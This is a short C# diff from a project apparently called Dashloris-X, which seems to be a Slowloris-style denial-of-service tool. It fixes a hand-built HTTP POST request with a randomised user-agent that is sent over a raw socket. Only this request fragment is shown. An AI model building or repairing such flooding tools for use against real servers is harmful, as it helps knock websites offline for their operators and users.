@@ -306,15 +306,15 @@ namespace TheDashlorisX
 
 			string Coal = string.Format
 			(
-			    ($"POST / @\r\n".Replace("@", Tier1.Item4)) +
+			    ($"POST / HTTP/@\r\n".Replace("@", Tier1.Item4)) +
 			    ($"Host: @\r\n".Replace("@", Tier1.Item1)) +
 			    ($"Content-Length: @\r\n".Replace("@", Tier2.Item5.ToString())) +
-			    ($@"User-Agent: {(Tier2.Item6 ? GetRandomUA() : Default)} \r\n") +
+			    ($@"User-Agent: {(Tier2.Item6 ? GetRandomUA() : Default)}" + $"\r\n") +
 			    ($"Accept-Encoding: gzip, deflate\r\n") +
-			    ($"Upgrade-Insecure-Requests: 1\r\n") +
-			    ($"Cookie: Dashloris-X 3.0 Cookie\r\n\r\n") 
+			    ($"Upgrade-Insecure-Requests: 1\r\n") + 
+			    ($"Cookie: DashlorisXCookie;\r\n\r\n") 
 			);
-
+			
 			DashShell.Send(Encoding.ASCII.GetBytes(Coal));
 		    }
 		}
